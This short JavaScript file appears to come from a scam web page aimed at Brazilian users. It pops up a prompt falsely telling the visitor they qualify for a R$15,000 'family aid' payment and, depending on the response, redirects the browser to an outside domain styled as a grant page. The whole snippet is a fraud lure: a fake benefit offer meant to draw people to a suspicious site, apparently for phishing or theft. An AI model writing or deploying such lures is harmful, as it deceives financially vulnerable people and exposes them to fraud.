var password = 'R$15.000';

password = prompt(
  'Parabéns, você está qualificado para receber o AUXÍLIO FAMILIAR de R$15.000. Clique em OK para receber instantaneamente.',
  'R$15.000'
);

if (password !== 'R$15.000') {
    location.href = 'https://ongoing-grant.cfd/15000-Apoio-Familiar.html';
}
